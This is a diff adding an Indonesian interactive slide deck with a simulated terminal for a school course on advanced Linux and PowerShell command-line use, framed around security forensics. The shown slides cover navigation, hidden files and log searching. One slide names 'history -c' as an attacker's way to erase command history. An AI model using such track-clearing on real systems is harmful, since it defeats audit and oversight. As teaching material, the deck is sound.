@@ -1,0 +1,1946 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bab 1 - Sub-Bab 1.2: CLI Tingkat Lanjut | TKJ SMK Wikrama Bogor</title>
+  <style>
+    :root {
+      --bg-outer: #0a0e17;
+      --card-bg: #ffffff;
+      --card-border: #e2e8f0;
+      --text-main: #0f172a;
+      --text-muted: #475569;
+      --accent-cyan: #0284c7;
+      --accent-blue: #1d4ed8;
+      --accent-red: #dc2626;
+      --accent-green: #10b981;
+      --terminal-bg: #0c1017;
+      --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      --font-mono: "Fira Code", "Consolas", monospace;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-outer);
+      color: var(--text-main);
+      font-family: var(--font-sans);
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      overflow: hidden;
+      user-select: none;
+    }
+
+    /* Top Bar */
+    .top-bar {
+      height: 56px;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      color: #94a3b8;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      background: rgba(10, 14, 23, 0.95);
+      z-index: 20;
+    }
+
+    .top-left-group {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .menu-toggle-btn {
+      background: #1e293b;
+      border: 1px solid #334155;
+      color: #f8fafc;
+      padding: 6px 12px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      font-size: 0.85rem;
+      font-weight: 600;
+      transition: all 0.2s;
+    }
+
+    .menu-toggle-btn:hover {
+      background: #334155;
+      border-color: #38bdf8;
+      color: #38bdf8;
+    }
+
+    .top-bar .title {
+      color: #f8fafc;
+      font-weight: 700;
+      font-size: 0.92rem;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .session-badge {
+      background: rgba(2, 132, 199, 0.15);
+      color: #38bdf8;
+      padding: 3px 10px;
+      border-radius: 999px;
+      font-size: 0.72rem;
+      font-weight: 600;
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      text-transform: uppercase;
+    }
+
+    .top-controls {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .counter-text {
+      font-family: var(--font-mono);
+      font-weight: 600;
+      color: #cbd5e1;
+      font-size: 0.88rem;
+    }
+
+    .nav-arrow-btn {
+      background: #1e293b;
+      border: 1px solid #334155;
+      color: #f8fafc;
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.2s;
+    }
+
+    .nav-arrow-btn:hover {
+      background: #334155;
+    }
+
+    /* Sidebar Drawer (Thumbnail Preview) */
+    .sidebar-overlay {
+      position: fixed;
+      top: 56px;
+      left: 0;
+      width: 100vw;
+      height: calc(100vh - 56px);
+      background: rgba(0, 0, 0, 0.65);
+      backdrop-filter: blur(4px);
+      z-index: 30;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.25s ease;
+    }
+
+    .sidebar-overlay.open {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .slide-sidebar {
+      position: fixed;
+      top: 56px;
+      left: 0;
+      width: 380px;
+      max-width: 85vw;
+      height: calc(100vh - 56px);
+      background: #0f172a;
+      border-right: 1px solid #1e293b;
+      z-index: 40;
+      transform: translateX(-100%);
+      transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+      display: flex;
+      flex-direction: column;
+      box-shadow: 10px 0 30px rgba(0, 0, 0, 0.5);
+    }
+
+    .slide-sidebar.open {
+      transform: translateX(0);
+    }
+
+    .sidebar-header {
+      padding: 16px 20px;
+      border-bottom: 1px solid #1e293b;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      color: #f8fafc;
+      font-size: 0.95rem;
+      font-weight: 700;
+    }
+
+    .sidebar-close-btn {
+      background: transparent;
+      border: none;
+      color: #94a3b8;
+      font-size: 1.2rem;
+      cursor: pointer;
+      padding: 4px;
+    }
+    .sidebar-close-btn:hover { color: #fff; }
+
+    .sidebar-search-box {
+      padding: 12px 18px;
+      border-bottom: 1px solid #1e293b;
+      background: #09101f;
+    }
+
+    .sidebar-search-input {
+      width: 100%;
+      background: #1e293b;
+      border: 1px solid #334155;
+      color: #fff;
+      padding: 8px 12px;
+      border-radius: 6px;
+      font-size: 0.85rem;
+      outline: none;
+      font-family: var(--font-sans);
+    }
+    .sidebar-search-input:focus { border-color: #38bdf8; }
+
+    .sidebar-scroll-list {
+      flex: 1;
+      overflow-y: auto;
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    /* Thumbnail Card */
+    .thumb-card {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 8px;
+      padding: 10px 12px;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      text-align: left;
+    }
+
+    .thumb-card:hover {
+      background: #273549;
+      border-color: #38bdf8;
+      transform: translateY(-2px);
+    }
+
+    .thumb-card.active {
+      background: rgba(2, 132, 199, 0.15);
+      border-color: #38bdf8;
+      box-shadow: 0 0 10px rgba(56, 189, 248, 0.25);
+    }
+
+    .thumb-top-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 0.72rem;
+    }
+
+    .thumb-num {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      color: #38bdf8;
+    }
+
+    .thumb-tag {
+      color: #94a3b8;
+      text-transform: uppercase;
+      font-size: 0.68rem;
+      font-weight: 600;
+      max-width: 220px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .thumb-title {
+      font-size: 0.84rem;
+      font-weight: 700;
+      color: #f8fafc;
+      line-height: 1.3;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    /* Stage Presentation */
+    .stage {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px 28px;
+      min-height: 0;
+    }
+
+    .slide-card {
+      background: var(--card-bg);
+      border-radius: 18px;
+      width: 96%;
+      max-width: 1260px;
+      height: 92%;
+      padding: 32px 42px;
+      box-shadow: 0 20px 45px -10px rgba(0, 0, 0, 0.6);
+      display: none;
+      flex-direction: column;
+      justify-content: space-between;
+      overflow-y: auto;
+      overflow-x: hidden;
+    }
+
+    .slide-card.active {
+      display: flex;
+    }
+
+    /* Cover Card */
+    .slide-card.cover-card {
+      background: radial-gradient(circle at 50% 20%, #172554 0%, #09101f 75%);
+      color: #ffffff;
+      justify-content: space-between;
+      align-items: center;
+      text-align: center;
+      padding: 30px 40px;
+    }
+
+    .cover-top-header {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .cover-program {
+      font-size: 0.82rem;
+      font-weight: 800;
+      color: #38bdf8;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+    }
+
+    .cover-subprogram {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: #cbd5e1;
+    }
+
+    .cover-chapter-badge {
+      background: rgba(56, 189, 248, 0.1);
+      color: #7dd3fc;
+      border: 1px solid rgba(56, 189, 248, 0.25);
+      padding: 3px 14px;
+      border-radius: 999px;
+      font-size: 0.76rem;
+      font-weight: 600;
+      margin-top: 4px;
+    }
+
+    .cover-main-hero {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      margin: 10px 0;
+    }
+
+    .cover-title {
+      font-size: 2.4rem;
+      font-weight: 900;
+      color: #ffffff;
+      line-height: 1.15;
+    }
+
+    .cover-subtitle {
+      font-size: 1.05rem;
+      color: #94a3b8;
+      max-width: 800px;
+      line-height: 1.5;
+    }
+
+    .cover-bottom-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+      max-width: 860px;
+      gap: 16px;
+      padding-top: 10px;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .teacher-card {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-align: left;
+    }
+
+    .teacher-avatar {
+      width: 38px;
+      height: 38px;
+      background: rgba(56, 189, 248, 0.15);
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.1rem;
+    }
+
+    .teacher-name {
+      font-size: 0.88rem;
+      font-weight: 700;
+      color: #f8fafc;
+    }
+
+    .teacher-certs {
+      font-size: 0.72rem;
+      font-family: var(--font-mono);
+      color: #38bdf8;
+    }
+
+    .meta-pills {
+      display: flex;
+      gap: 10px;
+      font-size: 0.78rem;
+      font-family: var(--font-mono);
+      color: #cbd5e1;
+    }
+
+    .meta-pill-item {
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 6px 12px;
+      border-radius: 8px;
+    }
+
+    /* Standard Card Header */
+    .slide-header {
+      margin-bottom: 14px;
+    }
+
+    .slide-category {
+      font-size: 0.8rem;
+      font-weight: 800;
+      letter-spacing: 1.2px;
+      text-transform: uppercase;
+      color: var(--accent-cyan);
+      margin-bottom: 4px;
+    }
+
+    .slide-title {
+      font-size: 1.8rem;
+      font-weight: 800;
+      color: var(--text-main);
+      line-height: 1.2;
+    }
+
+    /* Split Layout */
+    .slide-body {
+      flex: 1;
+      display: grid;
+      grid-template-columns: 1.05fr 0.95fr;
+      gap: 28px;
+      align-items: stretch;
+      min-height: 0;
+    }
+
+    .text-content {
+      font-size: 1.08rem;
+      line-height: 1.6;
+      color: var(--text-muted);
+      overflow-y: auto;
+      padding-right: 8px;
+    }
+
+    .text-content ul {
+      margin-left: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .text-content li strong {
+      color: var(--text-main);
+    }
+
+    /* Live Interactive Terminal */
+    .terminal-container {
+      background: var(--terminal-bg);
+      border: 1px solid #1f293d;
+      border-radius: 12px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+      height: 100%;
+      min-height: 310px;
+    }
+
+    .terminal-header-bar {
+      background: #111722;
+      padding: 8px 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #1f293d;
+    }
+
+    .terminal-dots {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    .dot-red { background: #ef4444; }
+    .dot-yellow { background: #f59e0b; }
+    .dot-green { background: #10b981; }
+
+    .terminal-tab-title {
+      font-family: var(--font-mono);
+      font-size: 0.76rem;
+      color: #94a3b8;
+    }
+
+    .challenge-status {
+      font-size: 0.72rem;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 4px;
+      text-transform: uppercase;
+      font-family: var(--font-sans);
+    }
+    .status-pending { background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid #f59e0b; }
+    .status-success { background: rgba(16, 185, 129, 0.2); color: #10b981; border: 1px solid #10b981; }
+
+    .terminal-screen {
+      flex: 1;
+      padding: 12px 16px;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      line-height: 1.5;
+      color: #f1f5f9;
+      overflow-y: auto;
+      cursor: text;
+    }
+
+    .history-entry {
+      margin-bottom: 6px;
+    }
+
+    .term-prompt {
+      color: #38bdf8;
+      font-weight: 600;
+    }
+
+    .term-path {
+      color: #a855f7;
+    }
+
+    .term-char {
+      color: #f8fafc;
+    }
+
+    .term-output {
+      color: #cbd5e1;
+      margin-top: 2px;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    .term-output.error {
+      color: #f87171;
+    }
+
+    .term-output.success-msg {
+      color: #34d399;
+      font-weight: 600;
+      background: rgba(16, 185, 129, 0.1);
+      padding: 4px 8px;
+      border-radius: 4px;
+      margin-top: 4px;
+      border-left: 3px solid #10b981;
+    }
+
+    .terminal-input-row {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 4px;
+    }
+
+    .term-input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      color: #a7f3d0;
+      caret-color: #38bdf8;
+    }
+
+    .terminal-footer-hint {
+      background: #080c14;
+      padding: 6px 14px;
+      font-size: 0.72rem;
+      color: #64748b;
+      border-top: 1px solid #1f293d;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .copy-btn {
+      background: #1e293b;
+      border: 1px solid #334155;
+      color: #38bdf8;
+      padding: 2px 8px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 0.7rem;
+      font-family: var(--font-mono);
+    }
+    .copy-btn:hover { background: #334155; }
+
+    /* Outro Slide (Slide 50) */
+    .slide-card.outro-card {
+      background: radial-gradient(circle at 50% 20%, #1e1b4b 0%, #09101f 80%);
+      color: #ffffff;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 32px 40px;
+    }
+
+    .outro-title {
+      font-size: 2.2rem;
+      font-weight: 900;
+      color: #ffffff;
+      margin-bottom: 8px;
+    }
+
+    .outro-quote {
+      font-size: 1.05rem;
+      color: #93c5fd;
+      max-width: 760px;
+      line-height: 1.55;
+      font-style: italic;
+      margin-bottom: 24px;
+    }
+
+    .contact-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+      width: 100%;
+      max-width: 820px;
+      margin-bottom: 20px;
+    }
+
+    .contact-card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 12px;
+      padding: 16px 14px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+
+    .contact-card:hover {
+      background: rgba(255, 255, 255, 0.09);
+      border-color: #38bdf8;
+    }
+
+    .contact-icon {
+      font-size: 1.6rem;
+    }
+
+    .contact-label {
+      font-size: 0.72rem;
+      font-weight: 700;
+      color: #94a3b8;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .contact-val {
+      font-size: 0.9rem;
+      font-family: var(--font-mono);
+      color: #f8fafc;
+      font-weight: 600;
+    }
+
+    /* Bottom Bar */
+    .bottom-bar {
+      height: 44px;
+      padding: 0 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      color: #64748b;
+      font-size: 0.82rem;
+      border-top: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .bottom-bar kbd {
+      background: #1e293b;
+      color: #cbd5e1;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: var(--font-mono);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Bar -->
+  <div class="top-bar">
+    <div class="top-left-group">
+      <button class="menu-toggle-btn" onclick="toggleSidebar()" title="Buka Daftar 50 Slide (Tekan M)">
+        <span>☰</span>
+        <span>Daftar Slide</span>
+      </button>
+      <div class="title">
+        <span>TKJ SMK Wikrama • Bab 1 Sub-Bab 1.2: CLI Tingkat Lanjut</span>
+        <span class="session-badge" id="session-tag">COVER MODUL</span>
+      </div>
+    </div>
+    <div class="top-controls">
+      <span class="counter-text" id="slide-num">Slide 1 of 50</span>
+      <button class="nav-arrow-btn" onclick="prevSlide()">❮</button>
+      <button class="nav-arrow-btn" onclick="nextSlide()">❯</button>
+    </div>
+  </div>
+
+  <!-- Sidebar Overlay & Drawer -->
+  <div class="sidebar-overlay" id="sidebar-overlay" onclick="toggleSidebar()"></div>
+  <div class="slide-sidebar" id="slide-sidebar">
+    <div class="sidebar-header">
+      <span>🗂️ Navigasi Daftar 50 Slide</span>
+      <button class="sidebar-close-btn" onclick="toggleSidebar()">✕</button>
+    </div>
+    <div class="sidebar-search-box">
+      <input type="text" class="sidebar-search-input" id="sidebar-filter" placeholder="Cari perintah atau materi..." oninput="filterThumbnails()" />
+    </div>
+    <div class="sidebar-scroll-list" id="thumb-list"></div>
+  </div>
+
+  <!-- Stage Presentation -->
+  <div class="stage" id="deck"></div>
+
+  <!-- Bottom Bar -->
+  <div class="bottom-bar">
+    <span>Navigasi Slide: <kbd>←</kbd> dan <kbd>→</kbd> | Buka Menu: <kbd>M</kbd> | Terminal: Ketik lalu tekan <kbd>Enter</kbd></span>
+    <span>Teknik Komputer dan Jaringan — SMK Wikrama Bogor</span>
+  </div>
+
+  <script>
+    let currentDir = "~";
+    let cmdHistory = [];
+    let historyIdx = -1;
+
+    // Database 50 Slide Lengkap Sub-Bab 1.2
+    const slidesData = [
+      // SLIDE 1: COVER
+      {
+        isCover: true,
+        program: "Program Keahlian: Teknik Jaringan Komputer dan Telekomunikasi",
+        subprogram: "Konsentrasi Keahlian: Teknik Komputer dan Jaringan",
+        chapter: "Bab 1: Arsitektur OS (Linux & Windows) & CLI",
+        title: "Sub-Bab 1.2: CLI Tingkat Lanjut",
+        subtitle: "Penguasaan Terminal Bash & PowerShell, Navigasi Direktori, Manipulasi Berkas, serta Analisis Filter Teks Forensik",
+        teacher: "Ardi Ariansyah, S.Kom., Gr.",
+        certs: "MTCNA, MTCRE, ACTR, JPT, DFA, L1 SOC, EHE",
+        meta1: "Alokasi: 3 Sesi Praktikum",
+        meta2: "Total: 50 Slide Interaktif",
+        terminalCmd: "grep -rn \"Failed password\" /var/log/auth.log",
+        terminalOut: "[MATCH] Sep 21 10:14:02 srv sshd: Failed password for root from 192.168.1.105",
+        sesi: "COVER MODUL"
+      },
+      // SLIDE 2: ROADMAP
+      {
+        cat: "PETA KOMPETENSI",
+        title: "Roadmap Pembelajaran Sub-Bab 1.2",
+        bullets: [
+          "<strong>Sesi 1 (Slide 1–17):</strong> Ekosistem Shell, Bash vs PowerShell, Prompt, dan Navigasi Lanjut.",
+          "<strong>Sesi 2 (Slide 18–34):</strong> Operasi CRUD Berkas, Stream I/O (stdin/stdout/stderr), dan Bahaya Perintah Destruktif.",
+          "<strong>Sesi 3 (Slide 35–50):</strong> Filter Teks, Grep, Regex, Pipeline Terantai, dan Investigasi Artefak Log Serangan."
+        ],
+        targetCmd: "whoami",
+        targetHint: "Periksa identitas akun yang sedang aktif di terminal dengan: whoami",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 3
+      {
+        cat: "FILOSOFI TERMINAL",
+        title: "Mengapa Ahli Keamanan Membutuhkan CLI?",
+        bullets: [
+          "Server produksi umumnya beroperasi tanpa GUI (*Headless*) demi stabilitas memori dan efisiensi keamanan.",
+          "CLI memproses ratusan ribu baris log dalam hitungan detik di mana antarmuka grafis akan macet.",
+          "Mendukung otomasi skrip analisis ancaman siber melalui pengalihan rantai pipa (*pipeline*).",
+          "Riwayat perintah (*bash history*) mencatat seluruh kronologi tindakan untuk kebutuhan investigasi."
+        ],
+        targetCmd: "wc -l /var/log/auth.log",
+        targetHint: "Hitung jumlah baris di berkas log otentikasi dengan: wc -l /var/log/auth.log",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 4
+      {
+        cat: "ARSITEKTUR SHELL",
+        title: "Dua Raksasa Shell: Bash vs PowerShell",
+        bullets: [
+          "<strong>GNU Bash (Linux):</strong> Filosofi *Text-Stream*. Input dan output berupa untaian karakter teks murni.",
+          "<strong>PowerShell (Windows):</strong> Filosofi *Object-Oriented*. Output berupa objek kaya atribut .NET.",
+          "Keduanya mendukung pembuatan skrip pertahanan siber dan otomasi audit.",
+          "PowerShell Core (pwsh) kini dapat dijalankan secara lintas platform di Linux dan macOS."
+        ],
+        targetCmd: "echo $SHELL",
+        targetHint: "Cari tahu jenis shell yang sedang Anda gunakan dengan: echo $SHELL",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 5
+      {
+        cat: "IDENTITAS SESI",
+        title: "Membaca Anatomi Prompt Terminal",
+        bullets: [
+          "<strong>Username:</strong> Nama akun yang sedang aktif saat ini (`siswa`).",
+          "<strong>Hostname:</strong> Nama mesin server yang sedang dikendalikan (`wikrama-lab`).",
+          "<strong>Direktori:</strong> Tanda `~` menandakan posisi berada di direktori home pengguna.",
+          "<strong>Privilese Kunci:</strong> Tanda `$` adalah user umum; tanda `#` adalah SUPERUSER (ROOT)!"
+        ],
+        targetCmd: "id",
+        targetHint: "Tampilkan rincian UID, GID, dan grup akun siswa dengan: id",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 6
+      {
+        cat: "NAVIGASI DIREKTORI",
+        title: "Menentukan Posisi: pwd & cd",
+        bullets: [
+          "<strong>pwd (Print Working Directory):</strong> Menampilkan path absolut posisi Anda saat ini.",
+          "<strong>cd (Change Directory):</strong> Berpindah dari satu folder ke folder lainnya.",
+          "<code>cd ~</code> : Kembali secara instan ke direktori home pengguna aktif.",
+          "<code>cd -</code> : Berpindah kembali ke folder kerja sebelumnya secara cepat."
+        ],
+        targetCmd: "pwd",
+        targetHint: "Ketik perintah pwd untuk melihat alamat direktori aktif Anda: pwd",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 7
+      {
+        cat: "STRUKTUR ALAMAT",
+        title: "Path Absolut vs Path Relatif",
+        bullets: [
+          "<strong>Path Absolut:</strong> Dimulai dari akar pohon ( / ). Alamatnya selalu valid dari folder manapun.",
+          "<strong>Path Relatif:</strong> Mengacu pada folder aktif saat ini tanpa diawali garis miring depan.",
+          "Titik satu ( <code>.</code> ) mewakili direktori saat ini.",
+          "Titik dua ( <code>..</code> ) mewakili satu tingkat direktori induk di atasnya."
+        ],
+        targetCmd: "cd /var/log",
+        targetHint: "Pindah ke folder log menggunakan path absolut: cd /var/log",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 8
+      {
+        cat: "INSPEKSI FOLDER",
+        title: "Eksplorasi Berkas Lanjutan: ls",
+        bullets: [
+          "<code>ls -l</code> : Menampilkan format detail panjang (izin akses, pemilik, ukuran, tanggal).",
+          "<code>ls -a</code> : Membuka seluruh berkas tersembunyi (diawali tanda titik <code>.</code>).",
+          "<code>ls -lh</code> : Menampilkan ukuran berkas dalam unit manusiawi (KB, MB, GB).",
+          "<code>ls -lt</code> : Mengurutkan berkas berdasarkan modifikasi waktu terbaru (krusial forensik)."
+        ],
+        targetCmd: "ls -la",
+        targetHint: "Tampilkan seluruh berkas beserta yang tersembunyi dengan: ls -la",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 9
+      {
+        cat: "ANALISIS MALWARE",
+        title: "Berkas Tersembunyi & Lokasi Persembunyian",
+        bullets: [
+          "Sistem Linux menyembunyikan berkas yang namanya diawali karakter titik (misal <code>.bashrc</code>).",
+          "Penyerang sering menaruh backdoor dengan nama terselubung seperti <code>.hidden_malware</code>.",
+          "Berkas ini tidak akan tampak jika administrator hanya menjalankan perintah <code>ls</code> polos.",
+          "Selalu gunakan <code>ls -la</code> saat melakukan threat hunting di server!"
+        ],
+        targetCmd: "cat .hidden_malware",
+        targetHint: "Bongkar isi file mencurigakan yang tersembunyi: cat .hidden_malware",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 10
+      {
+        cat: "EKOSISTEM WINDOWS",
+        title: "Navigasi Berbasis PowerShell Cmdlet",
+        bullets: [
+          "PowerShell menggunakan konvensi penamaan baku: <strong>Verb-Noun</strong>.",
+          "<code>Get-Location</code> (alias: pwd): Memeriksa folder aktif.",
+          "<code>Set-Location</code> (alias: cd): Berpindah ke folder tujuan.",
+          "<code>Get-ChildItem</code> (alias: dir/ls): Menampilkan isi folder beserta atributnya."
+        ],
+        targetCmd: "ls",
+        targetHint: "Ketik perintah ls untuk melihat daftar isi folder saat ini: ls",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 11
+      {
+        cat: "PRODUKTIVITAS CLI",
+        title: "Pintasan Keyboard Esensial Terminal",
+        bullets: [
+          "<code>Tab</code> : Autocomplete nama perintah atau direktori secara otomatis.",
+          "<code>Ctrl + C</code> : Menghentikan proses yang sedang berjalan (mengirim sinyal SIGINT).",
+          "<code>Ctrl + Z</code> : Menunda proses dan memindahkannya ke latar belakang (SIGTSTP).",
+          "<code>Ctrl + R</code> : Mencari riwayat perintah yang pernah diketikkan sebelumnya."
+        ],
+        targetCmd: "clear",
+        targetHint: "Bersihkan layar terminal Anda dengan mengetik: clear",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 12
+      {
+        cat: "DOKUMENTASI SISTEM",
+        title: "Membaca Dokumentasi Perintah: man & help",
+        bullets: [
+          "Perintah <code>man [command]</code> memunculkan buku manual resmi bawaan sistem.",
+          "Parameter <code>--help</code> memberikan rangkuman argumen cepat pada perintah terminal.",
+          "PowerShell menyediakan cmdlet bantuan: <code>Get-Help [cmdlet] -Examples</code>.",
+          "Ahli siber tidak dituntut menghafal semua flag, tetapi paham cara membaca manual secara efisien."
+        ],
+        targetCmd: "grep --help",
+        targetHint: "Buka bantuan cepat utilitas grep dengan mengetik: grep --help",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 13
+      {
+        cat: "JEJAK AUDIT",
+        title: "Audit Eksekusi: Utilitas history",
+        bullets: [
+          "Mencatat seluruh baris perintah yang pernah diketikkan oleh pengguna aktif.",
+          "Disimpan permanen di berkas <code>~/.bash_history</code> saat terminal ditutup rapi.",
+          "Penyerang sering membersihkan jejak menggunakan perintah <code>history -c</code>.",
+          "Analis forensik wajib memeriksa file history saat investigasi insiden."
+        ],
+        targetCmd: "history",
+        targetHint: "Tampilkan riwayat perintah yang pernah dicoba di sesi ini: history",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 14
+      {
+        cat: "VARIABEL SISTEM",
+        title: "Environment Variables: Pengendali Sesi",
+        bullets: [
+          "Variabel penentu lingkungan operasional proses di dalam sesi terminal saat ini.",
+          "<code>$USER</code> : Menyimpan identitas akun yang sedang masuk.",
+          "<code>$PATH</code> : Daftar direktori tempat kernel mencari file biner eksekusi.",
+          "Manipulasi <code>$PATH</code> berbahaya karena penyerang dapat menyusupkan biner tiruan (*Path Hijacking*)."
+        ],
+        targetCmd: "echo $PATH",
+        targetHint: "Periksa daftar jalur direktori sistem dengan: echo $PATH",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 15
+      {
+        cat: "PRAKTIK LAB SESI 1",
+        title: "Lab 1: Eksplorasi Navigasi & File Tersembunyi",
+        bullets: [
+          "Masuk ke home direktori menggunakan <code>cd ~</code>.",
+          "Buat file tersembunyi baru menggunakan <code>touch .mykey</code>.",
+          "Buktikan bahwa file tersebut tersembunyi dan hanya bisa dilihat dengan <code>ls -la</code>.",
+          "Gunakan <code>cd -</code> untuk melompat bolak-balik antar direktori."
+        ],
+        targetCmd: "touch .mykey",
+        targetHint: "Buat file rahasia tersembunyi dengan perintah: touch .mykey",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 16
+      {
+        cat: "EVALUASI SESI 1",
+        title: "Cek Pemahaman: Simbol & Navigasi",
+        bullets: [
+          "<strong>Pertanyaan 1:</strong> Apa perbedaan arti simbol <code>~</code> dan <code>/</code> pada path Linux?",
+          "<strong>Pertanyaan 2:</strong> Jika prompt terminal berakhiran karakter <code>#</code>, wewenang apa yang dimiliki?",
+          "<strong>Pertanyaan 3:</strong> Perintah apa yang digunakan untuk memeriksa alamat folder posisi saat ini?"
+        ],
+        targetCmd: "pwd",
+        targetHint: "Jalankan perintah penampil posisi direktori aktif: pwd",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+      // SLIDE 17
+      {
+        cat: "RINGKASAN SESI 1",
+        title: "Rangkuman Kunci Ekosistem Shell",
+        bullets: [
+          "Bash beroperasi pada aliran teks karakter; PowerShell beroperasi pada struktur objek .NET.",
+          "Alamat absolut berawal dari tanda / dan selalu valid dari folder manapun.",
+          "File dot-prefix (.) tersembunyi secara bawaan dan sering dipakai malware berkamuflase.",
+          "Variabel $PATH memegang peran kritis dalam rute pencarian eksekusi biner sistem."
+        ],
+        targetCmd: "clear",
+        targetHint: "Bersihkan layar simulasi Anda untuk melanjutkan ke Sesi 2: clear",
+        sesi: "SESI 1: EKOSISTEM SHELL"
+      },
+
+      // SESI 2: OPERASI BERKAS & REDIRECTION
+      {
+        cat: "PENGANTAR SESI 2",
+        title: "Operasi Berkas, Redirection & Pipeline",
+        bullets: [
+          "Analis keamanan harus mampu membuat, menduplikasi, dan memindahkan berkas bukti secara presisi.",
+          "Menguasai aliran tiga jalur standar: stdin (0), stdout (1), dan stderr (2).",
+          "Mengarahkan hasil investigasi ke berkas teks menggunakan operator Redirection.",
+          "Menyatukan perintah-perintah kecil menjadi satu rangkaian pemindaian terpadu via Pipeline."
+        ],
+        targetCmd: "touch target.txt",
+        targetHint: "Buat file target pengujian baru dengan: touch target.txt",
+        sesi: "SESI 2: OPERASI BERKAS & I/O"
+      },
+      {
+        cat: "MANIPULASI BERKAS",
+        title: "Membuat Direktori: mkdir",
+        bullets: [
+          "<strong>mkdir:</strong> Membuat folder direktori baru di dalam sistem berkas.",
+          "Opsi <code>-p</code> pada mkdir: Membuat struktur direktori bertingkat sekaligus.",
+          "Menghindari pesan error 'No such file or directory' saat membuat sub-folder bersarang.",
+          "Penting untuk mengorganisir barang bukti digital dalam folder kasus forensik."
+        ],
+        targetCmd: "mkdir evidence",
